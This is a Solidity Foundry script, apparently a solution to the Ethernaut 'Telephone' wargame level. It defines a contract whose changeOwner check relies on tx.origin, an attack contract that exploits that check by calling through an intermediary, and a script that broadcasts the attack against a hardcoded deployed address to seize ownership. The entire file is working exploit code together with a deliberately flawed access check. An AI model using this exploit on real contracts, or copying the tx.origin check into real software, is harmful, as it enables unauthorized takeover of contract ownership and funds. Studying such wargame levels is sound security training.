// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Script.sol";


contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack {
    Telephone public victim;

    constructor(address _telephone) {
        victim = Telephone(_telephone);
    }

    function getOwnership (address _newOwner) public {
        victim.changeOwner(_newOwner);
    }
}

contract ContractScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        TelephoneAttack attacker = new TelephoneAttack(0xF7EcBFEb36C721F9eB4226d69855E98D698b238c);
        attacker.getOwnership(0xCd5EBC2dD4Cb3dc52ac66CEEcc72c838B40A5931);
        vm.stopBroadcast();
    }
}
